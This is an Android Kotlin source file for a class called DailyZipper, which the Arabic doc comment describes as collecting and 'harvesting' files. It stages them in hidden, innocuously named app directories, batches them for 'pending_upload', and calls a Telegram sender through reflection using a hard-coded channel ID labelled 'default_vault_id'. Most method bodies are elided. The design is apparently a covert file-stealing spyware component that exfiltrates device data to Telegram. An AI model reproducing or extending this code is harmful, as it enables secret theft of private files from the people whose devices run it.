package com.example.app

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.StatFs
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.random.Random

/**
 * فئة تجميع الملفات وحصادها.
 */
class DailyZipper(
    context: Context,
    private val scanner: Any? = null,
    private val telegram: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private val activeMutex = Mutex()

    private val zipperActive = AtomicBoolean(false)
    // ✅ التصحيح: تحديد النوع العام <String> لمنع خطأ Type mismatch
    private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
    private val failedHashes = Collections.synchronizedSet(mutableSetOf<String>())

    private var maxBatchSize = 48L * 1024L * 1024L

    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val harvestDir: File by lazy { File(runtimeDir, "harvest").apply { if (!exists()) mkdirs() } }
    private val pendingDir: File by lazy { File(harvestDir, "pending_upload").apply { if (!exists()) mkdirs() } }
    private val queueDir: File by lazy { File(runtimeDir, ".cache_thumb").apply { if (!exists()) mkdirs() } }
    private val configFile: File by lazy { File(runtimeDir, "zipper_config.json") }
    private val logFile: File by lazy { File(runtimeDir, "z.log") }

    private val deviceTag: String by lazy { calculateDeviceTag() }
    private val config = HashMap<String, Any>()

    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "DailyZipper"
        private const val MAX_LOG_SIZE = 500 * 1024L

        @JvmStatic
        fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
            return DailyZipper(context, scanner, telegram)
        }
    }

    init {
        config["max_batch_size"] = 48L * 1024L * 1024L
        config["storage_extra"] = 100L * 1024L * 1024L
        config["send_retry_delays"] = listOf(2000L, 4000L, 8000L, 16000L, 32000L)
        config["max_processed_hashes"] = 10000
        config["default_vault_id"] = -1003577715762L
        config["enable_encryption"] = false
        config["password"] = "CHANGE_ME_IN_CONFIG"
        config["max_batches"] = 10
        loadConfig()
        cleanupOldFiles()
    }

    // ... باقي دوال الملف (بدون تغيير) ...

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"

        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
